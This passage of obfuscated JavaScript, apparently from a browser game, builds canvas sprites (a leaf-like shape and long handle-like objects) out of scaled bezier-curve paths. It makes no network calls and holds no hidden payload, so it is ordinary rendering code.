			Δ.bezierCurveTo(ᐃ * 308.0000305175781, 130.58523559570312 * ᐃ, 279.0000305175781 * ᐃ, 158.58523559570312 * ᐃ, ᐃ * 254.00003051757812, 175.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 287.0000305175781, 182.58523559570312 * ᐃ, 274.0000305175781 * ᐃ, ᐃ * 181.08523559570312, 294.0000305175781 * ᐃ, ᐃ * 186.58523559570312);
			Δ.bezierCurveTo(ᐃ * 293.5000305175781, 196.08523559570312 * ᐃ, 293.5000305175781 * ᐃ, 196.08523559570312 * ᐃ, 293.0000305175781 * ᐃ, 205.58523559570312 * ᐃ);
			Δ.bezierCurveTo(304.0000305175781 * ᐃ, 201.08523559570312 * ᐃ, ᐃ * 304.0000305175781, ᐃ * 201.08523559570312, 315.0000305175781 * ᐃ, 196.58523559570312 * ᐃ);
			Δ.bezierCurveTo(350.0000305175781 * ᐃ, ᐃ * 219.58523559570312, 343.0000305175781 * ᐃ, ᐃ * 221.58523559570312, 351.0000305175781 * ᐃ, ᐃ * 230.58523559570312);
			Δ.bezierCurveTo(ᐃ * 296.0000305175781, 260.5852355957031 * ᐃ, ᐃ * 264.0000305175781, ᐃ * 256.5852355957031, ᐃ * 220.00003051757812, ᐃ * 236.58523559570312);
			Δ.bezierCurveTo(ᐃ * 233.00003051757812, 266.5852355957031 * ᐃ, ᐃ * 232.00003051757812, 279.5852355957031 * ᐃ, 231.00003051757812 * ᐃ, ᐃ * 295.5852355957031);
			Δ.bezierCurveTo(ᐃ * 222.00003051757812, 297.5852355957031 * ᐃ, ᐃ * 222.00003051757812, ᐃ * 297.5852355957031, 213.00003051757812 * ᐃ, 299.5852355957031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 219.50003051757812, ᐃ * 308.0852355957031, ᐃ * 219.50003051757812, 308.0852355957031 * ᐃ, ᐃ * 226.00003051757812, ᐃ * 316.5852355957031);
			Δ.bezierCurveTo(ᐃ * 223.00003051757812, 344.5852355957031 * ᐃ, ᐃ * 216.00003051757812, 350.5852355957031 * ᐃ, 209.00003051757812 * ᐃ, 363.5852355957031 * ᐃ);
			Δ.bezierCurveTo(154.00003051757812 * ᐃ, ᐃ * 318.5852355957031, 156.00003051757812 * ᐃ, ᐃ * 268.5852355957031, 160.00003051757812 * ᐃ, ᐃ * 238.58523559570312);
			Δ.bezierCurveTo(ᐃ * 135.00003051757812, 268.5852355957031 * ᐃ, ᐃ * 125.00003051757812, ᐃ * 267.5852355957031, 112.00003051757812 * ᐃ, ᐃ * 272.5852355957031);
			Δ.bezierCurveTo(104.50003051757812 * ᐃ, ᐃ * 266.5852355957031, ᐃ * 104.50003051757812, 266.5852355957031 * ᐃ, 97.00003051757812 * ᐃ, 260.5852355957031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93.00003051757812, 271.0852355957031 * ᐃ, ᐃ * 93.00003051757812, 271.0852355957031 * ᐃ, 89.00003051757812 * ᐃ, ᐃ * 281.5852355957031);
			Δ.bezierCurveTo(ᐃ * 66.00003051757812, ᐃ * 288.5852355957031, ᐃ * 59.000030517578125, 288.5852355957031 * ᐃ, ᐃ * 39.000030517578125, 285.5852355957031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 56.000030517578125, 216.58523559570312 * ᐃ, 91.00003051757812 * ᐃ, ᐃ * 204.58523559570312, 129.00003051757812 * ᐃ, ᐃ * 189.58523559570312);
			Δ.bezierCurveTo(90.00003051757812 * ᐃ, ᐃ * 176.58523559570312, 89.00003051757812 * ᐃ, 173.58523559570312 * ᐃ, 79.00003051757812 * ᐃ, ᐃ * 166.58523559570312);
			Δ.bezierCurveTo(82.00003051757812 * ᐃ, 155.08523559570312 * ᐃ, ᐃ * 82.00003051757812, 155.08523559570312 * ᐃ, 85.00003051757812 * ᐃ, ᐃ * 143.58523559570312);
			Δ.bezierCurveTo(ᐃ * 75.50003051757812, 147.58523559570312 * ᐃ, ᐃ * 75.50003051757812, ᐃ * 147.58523559570312, ᐃ * 66.00003051757812, 151.58523559570312 * ᐃ);
			Δ.bezierCurveTo(44.000030517578125 * ᐃ, ᐃ * 133.58523559570312, 41.000030517578125 * ᐃ, ᐃ * 124.58523559570312, 34.000030517578125 * ᐃ, 102.58523559570312 * ᐃ);
			Δ.bezierCurveTo(100.00003051757812 * ᐃ, 81.58523559570312 * ᐃ, 134.00003051757812 * ᐃ, 118.58523559570312 * ᐃ, ᐃ * 150.00003051757812, ᐃ * 128.58523559570312);
			Δ.bezierCurveTo(ᐃ * 144.00003051757812, 102.58523559570312 * ᐃ, ᐃ * 147.00003051757812, 90.58523559570312 * ᐃ, 150.00003051757812 * ᐃ, 80.58523559570312 * ᐃ);
			Δ.bezierCurveTo(159.50003051757812 * ᐃ, 79.08523559570312 * ᐃ, ᐃ * 159.50003051757812, 79.08523559570312 * ᐃ, ᐃ * 169.00003051757812, 77.58523559570312 * ᐃ);
			Δ.bezierCurveTo(163.00003051757812 * ᐃ, 72.58523559570312 * ᐃ, ᐃ * 163.00003051757812, 72.58523559570312 * ᐃ, ᐃ * 157.00003051757812, 67.58523559570312 * ᐃ);
			Δ.bezierCurveTo(162.00003051757812 * ᐃ, 42.585235595703125 * ᐃ, 169.00003051757812 * ᐃ, ᐃ * 29.585235595703125, ᐃ * 182.00003051757812, 14.585235595703125 * ᐃ);
			Δ.bezierCurveTo(219.00003051757812 * ᐃ, ᐃ * 48.585235595703125, 222.00003051757812 * ᐃ, 92.58523559570312 * ᐃ, 218.00003051757812 * ᐃ, ᐃ * 112.58523559570312);
			Δ.bezierCurveTo(239.00003051757812 * ᐃ, 95.58523559570312 * ᐃ, ᐃ * 242.00003051757812, 97.58523559570312 * ᐃ, 249.00003051757812 * ᐃ, ᐃ * 94.58523559570312);
			Δ.bezierCurveTo(255.00003051757812 * ᐃ, ᐃ * 103.08523559570312, 255.00003051757812 * ᐃ, 103.08523559570312 * ᐃ, 261.0000305175781 * ᐃ, 111.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 261.5000305175781, ᐃ * 99.58523559570312, ᐃ * 261.5000305175781, 99.58523559570312 * ᐃ, ᐃ * 262.0000305175781, 87.58523559570312 * ᐃ);
			Δ.bezierCurveTo(282.0000305175781 * ᐃ, ᐃ * 77.58523559570312, ᐃ * 301.0000305175781, ᐃ * 74.58523559570312, 314.0000305175781 * ᐃ, ᐃ * 76.58523559570312);
			Δ.closePath();
			ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[2], ᐃ * 4);
			return Ⲇⵠ
		}
		const ⵠΔⵠΔⵠΔⵠ = ⵠⵠⲆⲆⵠ;

		function ⵠᐃᐃⲆⲆⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * ᐃΔⲆⲆᐃ;
			Ⲇⵠ.height = ᐃ * 648;
			Δ.translate(ᐃΔᐃⲆⵠ * ᐃ, 20 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.save();
			Δ.translate(50.5 * ᐃ, ᐃ * 349.5);
			Ⲇᐃᐃ(Δ, -13.5 * ᐃ, ᐃ * -249.5, 27 * ᐃ, ᐃ * 499, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(36 * ᐃ, ᐃ * 538);
			Δ.bezierCurveTo(ᐃ * 49.5, 538 * ᐃ, ᐃ * 49.5, 538 * ᐃ, 63 * ᐃ, ᐃ * 538);
			Δ.bezierCurveTo(ᐃ * 63.5, 568 * ᐃ, 63.5 * ᐃ, 568 * ᐃ, ᐃ * 64, ᐃ * 598);
			Δ.bezierCurveTo(50 * ᐃ, 598 * ᐃ, ᐃ * 50, ᐃ * 598, 36 * ᐃ, ᐃ * 598);
			Δ.bezierCurveTo(36 * ᐃ, 568.5 * ᐃ, ᐃ * 36, 568.5 * ᐃ, ᐃ * 36, 539 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 36, ᐃ * 554);
			Δ.bezierCurveTo(45 * ᐃ, ᐃ * 561, ᐃ * 56, ᐃ * 558, ᐃ * 63, ᐃ * 554);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 32, 569 * ᐃ);
			Δ.bezierCurveTo(44 * ᐃ, ᐃ * 576, 58 * ᐃ, ᐃ * 574, 68 * ᐃ, 569 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 68, 584 * ᐃ, 68 * ᐃ, ᐃ * 584, 68 * ᐃ, 599 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 68, 608 * ᐃ, 65 * ᐃ, ᐃ * 618, ᐃ * 49, ᐃ * 617);
			Δ.bezierCurveTo(34 * ᐃ, ᐃ * 617, ᐃ * 32, ᐃ * 610, 32 * ᐃ, ᐃ * 598);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(41 * ᐃ, 581 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 48, ᐃ * 584, 55 * ᐃ, 583 * ᐃ, 60 * ᐃ, 581 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 60, 589.5 * ᐃ, ᐃ * 60, 589.5 * ᐃ, ᐃ * 60, ᐃ * 598);
			Δ.bezierCurveTo(60 * ᐃ, ᐃ * 604, ᐃ * 59, 609 * ᐃ, 48 * ᐃ, 608 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 40, ᐃ * 607, 40 * ᐃ, 606 * ᐃ, ᐃ * 41, 581 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(31 * ᐃ, ᐃ * 106);
			Δ.bezierCurveTo(ᐃ * 31, ᐃ * 124.5, ᐃ * 31, 124.5 * ᐃ, ᐃ * 31, ᐃ * 143);
			Δ.bezierCurveTo(31 * ᐃ, ᐃ * 163, 38 * ᐃ, 169 * ᐃ, 48 * ᐃ, 168 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, 168 * ᐃ, 67 * ᐃ, ᐃ * 165, 67 * ᐃ, 148 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 67, ᐃ * 123.5, 67 * ᐃ, 123.5 * ᐃ, ᐃ * 67, 99 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 49, ᐃ * 27);
			Δ.bezierCurveTo(64 * ᐃ, 62.5 * ᐃ, 64 * ᐃ, 62.5 * ᐃ, ᐃ * 79, ᐃ * 98);
			Δ.bezierCurveTo(ᐃ * 74, 113 * ᐃ, ᐃ * 63, 121 * ᐃ, 50 * ᐃ, ᐃ * 122);
			Δ.bezierCurveTo(ᐃ * 35, ᐃ * 123, ᐃ * 22, 109 * ᐃ, ᐃ * 20, ᐃ * 98);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(49 * ᐃ, ᐃ * 43);
			Δ.bezierCurveTo(ᐃ * 61, ᐃ * 70, 61 * ᐃ, 70 * ᐃ, 73 * ᐃ, ᐃ * 97);
			Δ.bezierCurveTo(ᐃ * 66, ᐃ * 116, 43 * ᐃ, 122 * ᐃ, ᐃ * 26, ᐃ * 99);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃᐃ]);
			Δ.translate(-ⵠΔⵠⵠᐃ * ᐃ, ᐃ * -ⵠᐃΔᐃᐃ);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(50.5 * ᐃ, ᐃ * 349.5);
			Ⲇᐃᐃ(Δ, -13.5 * ᐃ, -249.5 * ᐃ, 27 * ᐃ, 499 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ], Ⲇᐃ[2], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(36 * ᐃ, 538 * ᐃ);
			Δ.bezierCurveTo(49.5 * ᐃ, 538 * ᐃ, 49.5 * ᐃ, ᐃ * 538, 63 * ᐃ, 538 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63.5, ᐃ * 568, 63.5 * ᐃ, ᐃ * 568, 64 * ᐃ, 598 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50, ᐃ * 598, 50 * ᐃ, ᐃ * 598, 36 * ᐃ, ᐃ * 598);
			Δ.bezierCurveTo(ᐃ * 36, ᐃ * 568.5, ᐃ * 36, ᐃ * 568.5, ᐃ * 36, 539 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ΔⲆᐃⵠᐃ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(36 * ᐃ, ᐃ * 554);
			Δ.bezierCurveTo(45 * ᐃ, 561 * ᐃ, 56 * ᐃ, 558 * ᐃ, ᐃ * 63, 554 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆⲆⲆΔ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 32, ᐃ * 569);
			Δ.bezierCurveTo(ᐃ * 44, 576 * ᐃ, 58 * ᐃ, 574 * ᐃ, ᐃ * 68, ᐃ * 569);
			Δ.bezierCurveTo(68 * ᐃ, 584 * ᐃ, 68 * ᐃ, ᐃ * 584, ᐃ * 68, ᐃ * 599);
			Δ.bezierCurveTo(68 * ᐃ, 608 * ᐃ, 65 * ᐃ, ᐃ * 618, ᐃ * 49, ᐃ * 617);
			Δ.bezierCurveTo(ᐃ * 34, 617 * ᐃ, ᐃ * 32, 610 * ᐃ, 32 * ᐃ, 598 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], ᐃ * ⵠⵠⵠΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 41, ᐃ * 581);
			Δ.bezierCurveTo(ᐃ * 48, 584 * ᐃ, ᐃ * 55, 583 * ᐃ, ᐃ * 60, 581 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 60, 589.5 * ᐃ, ᐃ * 60, ᐃ * 589.5, 60 * ᐃ, 598 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 60, ᐃ * 604, ᐃ * 59, 609 * ᐃ, ᐃ * 48, ᐃ * 608);
			Δ.bezierCurveTo(ᐃ * 40, 607 * ᐃ, 40 * ᐃ, 606 * ᐃ, 41 * ᐃ, ᐃ * 581);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(31 * ᐃ, ᐃ * 106);
			Δ.bezierCurveTo(31 * ᐃ, 124.5 * ᐃ, ᐃ * 31, ᐃ * 124.5, 31 * ᐃ, ᐃ * 143);
			Δ.bezierCurveTo(ᐃ * 31, ᐃ * 163, 38 * ᐃ, 169 * ᐃ, 48 * ᐃ, ᐃ * 168);
			Δ.bezierCurveTo(ᐃ * 57, ᐃ * 168, ᐃ * 67, 165 * ᐃ, ᐃ * 67, 148 * ᐃ);
			Δ.bezierCurveTo(67 * ᐃ, 123.5 * ᐃ, 67 * ᐃ, 123.5 * ᐃ, ᐃ * 67, 99 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔⲆ], Ⲇᐃ[ⵠΔᐃΔⲆ], ΔⲆᐃⵠⲆΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * -46, ᐃ * -50);
			Δ.scale(ᐃⵠⲆⲆⲆ, 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(51 * ᐃ, 80 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51, ᐃ * 89.5, ᐃ * 51, 89.5 * ᐃ, 51 * ᐃ, ᐃ * 99);
			Δ.bezierCurveTo(49 * ᐃ, ᐃ * 103, ᐃ * 46, 105 * ᐃ, 44 * ᐃ, ᐃ * 99);
			Δ.bezierCurveTo(ᐃ * 44, ᐃ * 88.5, ᐃ * 44, ᐃ * 88.5, 44 * ᐃ, 78 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃᐃⲆᐃ]);
			Δ.restore();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 49, ᐃ * 27);
			Δ.bezierCurveTo(ᐃ * 64, ᐃ * 62.5, ᐃ * 64, ᐃ * 62.5, 79 * ᐃ, ᐃ * 98);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 113, 63 * ᐃ, ᐃ * 121, ᐃ * 50, ᐃ * 122);
			Δ.bezierCurveTo(35 * ᐃ, 123 * ᐃ, ᐃ * 22, 109 * ᐃ, 20 * ᐃ, 98 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠᐃ], Ⲇᐃ[9], 8 * ᐃ);
			Δ.scale(ⲆᐃᐃⲆ, ⲆΔΔⵠ);
			Δ.translate(ᐃ * -23, ᐃ * -20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(57 * ᐃ, ᐃ * 69);
			Δ.bezierCurveTo(50 * ᐃ, 76 * ᐃ, ᐃ * 43, 75 * ᐃ, 38 * ᐃ, ᐃ * 69);
			Δ.bezierCurveTo(ᐃ * 43, ᐃ * 57, ᐃ * 43, 57 * ᐃ, ᐃ * 48, 45 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[10]);
			return Ⲇⵠ
		}

		function ᐃⵠⵠⵠᐃⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 81;
			Ⲇⵠ.height = 626 * ᐃ;
			Δ.translate(ᐃ * 20, ⵠⵠΔΔᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔⲆ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 55, ᐃ * 565);
			Δ.bezierCurveTo(ᐃ * 56, 586 * ᐃ, ᐃ * 53, 591 * ᐃ, ᐃ * 40, ᐃ * 592);
			Δ.bezierCurveTo(ᐃ * 28, 591 * ᐃ, ᐃ * 27, ᐃ * 583, 28 * ᐃ, ᐃ * 557);
			Δ.bezierCurveTo(27.5 * ᐃ, ᐃ * 346, 27.5 * ᐃ, 346 * ᐃ, ᐃ * 27, ᐃ * 135);
			Δ.bezierCurveTo(26 * ᐃ, 74 * ᐃ, 36 * ᐃ, ᐃ * 26, 41 * ᐃ, 15 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54, 51 * ᐃ, ᐃ * 54, 81 * ᐃ, 55 * ᐃ, ᐃ * 128);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(-ⵠⵠΔΔᐃ * ᐃ, ᐃ * -ⵠⵠΔΔᐃ);
			Δ.globalAlpha = ⵠΔᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(55 * ᐃ, 565 * ᐃ);
			Δ.bezierCurveTo(56 * ᐃ, 586 * ᐃ, 53 * ᐃ, 591 * ᐃ, ᐃ * 40, 592 * ᐃ);
			Δ.bezierCurveTo(28 * ᐃ, ᐃ * 591, ᐃ * 27, ᐃ * 583, ᐃ * 28, ᐃ * 557);
			Δ.bezierCurveTo(27.5 * ᐃ, 346 * ᐃ, ᐃ * 27.5, 346 * ᐃ, ᐃ * 27, ᐃ * 135);
			Δ.bezierCurveTo(ᐃ * 26, ᐃ * 74, 36 * ᐃ, 26 * ᐃ, 41 * ᐃ, ᐃ * ⵠⵠⵠᐃΔⲆⵠ);
			Δ.bezierCurveTo(54 * ᐃ, ᐃ * 51, 54 * ᐃ, 81 * ᐃ, 55 * ᐃ, 128 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃⵠⵠⵠⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 27, ᐃ * 129);
			Δ.bezierCurveTo(ᐃ * 32, ᐃ * 135, ᐃ * 48, 136 * ᐃ, 53 * ᐃ, ᐃ * 129);
			Δ.bezierCurveTo(ᐃ * 56, 97 * ᐃ, ᐃ * 53, 82 * ᐃ, ᐃ * 52, 64 * ᐃ);
			Δ.bezierCurveTo(49 * ᐃ, ᐃ * 33, ᐃ * 44, 27 * ᐃ, 41 * ᐃ, ᐃ * 21);
			Δ.bezierCurveTo(ᐃ * 31, ᐃ * 40, ᐃ * 28, ᐃ * 84, ᐃ * 27, 127 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 55, ᐃ * 565);
			Δ.bezierCurveTo(ᐃ * 56, ᐃ * 586, ᐃ * 53, 591 * ᐃ, 40 * ᐃ, ᐃ * 592);
			Δ.bezierCurveTo(ᐃ * 28, ᐃ * 591, 27 * ᐃ, ᐃ * 583, 28 * ᐃ, ᐃ * 557);
			Δ.bezierCurveTo(27.5 * ᐃ, ᐃ * 346, ᐃ * 27.5, 346 * ᐃ, ᐃ * 27, 135 * ᐃ);
			Δ.bezierCurveTo(26 * ᐃ, ᐃ * 74, ᐃ * 36, 26 * ᐃ, 41 * ᐃ, ᐃ * ᐃⲆⵠⵠᐃ);
			Δ.bezierCurveTo(54 * ᐃ, 51 * ᐃ, ᐃ * 54, 81 * ᐃ, ᐃ * 55, 128 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[2], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 28, 475 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 38, ᐃ * 482, 48 * ᐃ, ᐃ * 480, ᐃ * 54, 474 * ᐃ);
			Δ.bezierCurveTo(54 * ᐃ, ᐃ * 509.5, 54 * ᐃ, ᐃ * 509.5, 54 * ᐃ, 545 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46, 554 * ᐃ, ᐃ * 36, 552 * ᐃ, 28 * ᐃ, ᐃ * 545);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(28 * ᐃ, ᐃ * 496);
			Δ.bezierCurveTo(ᐃ * 39, ᐃ * 506, 49 * ᐃ, 503 * ᐃ, 54 * ᐃ, 496 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[5], ᐃ * ΔᐃΔⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(28 * ᐃ, 521 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41, 529 * ᐃ, 49 * ᐃ, ᐃ * 524, 54 * ᐃ, 520 * ᐃ);
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[ᐃᐃⲆᐃ], 8 * ᐃ);
			return Ⲇⵠ
		}
		const ᐃⲆⵠᐃΔ = Ⲇⵠⵠᐃ;

		function ⵠᐃΔΔΔΔⲆⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 81 * ᐃ;
			Ⲇⵠ.height = 350 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .6 : ᐃⲆᐃ;
			Δ.translate(0, ᐃ * 5);
			Δ.save();
			Δ.translate(35 * ᐃ, ᐃ * 160);
			Δ.rotate(Δᐃᐃⵠ);
			Ⲇᐃᐃ(Δ, -6 * ᐃ, ᐃ * -100.5, ᐃ * ⲆⲆΔΔⵠΔⲆ, ᐃ * 240, ᐃ * ΔⲆⵠⲆⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.translate(ΔᐃΔΔ, -ⵠᐃⲆΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.save();
			Δ.translate(ᐃ * -ⲆᐃⲆΔΔ, 11 * ᐃ);
			Δ.moveTo(26.0714111328125 * ᐃ, ᐃ * 50.9);
			Δ.bezierCurveTo(ᐃ * 32.0714111328125, ᐃ * 35.892852783203125, ᐃ * 39.0714111328125, ᐃ * 18.892852783203125, ᐃ * 45.0714111328125, ᐃ * 7.892852783203125);
			Δ.bezierCurveTo(51.0714111328125 * ᐃ, 13.892852783203125 * ᐃ, 56.0714111328125 * ᐃ, 36.892852783203125 * ᐃ, ᐃ * 60.0714111328125, 50.892852783203125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 52.5714111328125, ᐃ * 58.892852783203125, 52.5714111328125 * ᐃ, ᐃ * 58.892852783203125, 45.0714111328125 * ᐃ, ᐃ * 66.89285278320312);
			Δ.bezierCurveTo(ᐃ * 37.0714111328125, ᐃ * 58.892852783203125, ᐃ * 37.0714111328125, 58.892852783203125 * ᐃ, ᐃ * 29.0714111328125, ᐃ * 50.892852783203125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.restore();
			Δ.globalAlpha = ΔᐃⲆⵠ;
			Δ.save();
			Δ.translate(Ⲇᐃᐃᐃ, ᐃ * -10);
			Δ.translate(ᐃ * 45.0714111328125, ᐃ * 149.39285278320312);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -6, -94.5 * ᐃ, ⵠⲆΔΔᐃ * ᐃ, 250 * ᐃ, ΔⲆⵠⲆⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠⵠΔ], ᐃ * ⵠᐃΔⵠⲆ);
			Δ.translate(ᐃΔΔ, ᐃ * 0);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 29.0714111328125, ᐃ * 50.9);
			Δ.bezierCurveTo(ᐃ * 32.0714111328125, 35.892852783203125 * ᐃ, ᐃ * 39.0714111328125, ᐃ * 18.892852783203125, ᐃ * 45.0714111328125, 7.892852783203125 * ᐃ);
			Δ.bezierCurveTo(51.0714111328125 * ᐃ, 13.892852783203125 * ᐃ, 56.0714111328125 * ᐃ, ᐃ * 36.892852783203125, 60.0714111328125 * ᐃ, ᐃ * 50.892852783203125);
			Δ.bezierCurveTo(ᐃ * 52.5714111328125, ᐃ * 58.892852783203125, 52.5714111328125 * ᐃ, ᐃ * 58.892852783203125, 45.0714111328125 * ᐃ, ᐃ * 66.89285278320312);
			Δ.bezierCurveTo(ᐃ * 37.0714111328125, ᐃ * 58.892852783203125, 37.0714111328125 * ᐃ, ᐃ * 58.892852783203125, 29.0714111328125 * ᐃ, 50.892852783203125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[Ⲇᐃⵠᐃ], ⵠΔΔΔΔⵠⲆ * ᐃ);
			return Ⲇⵠ
		}

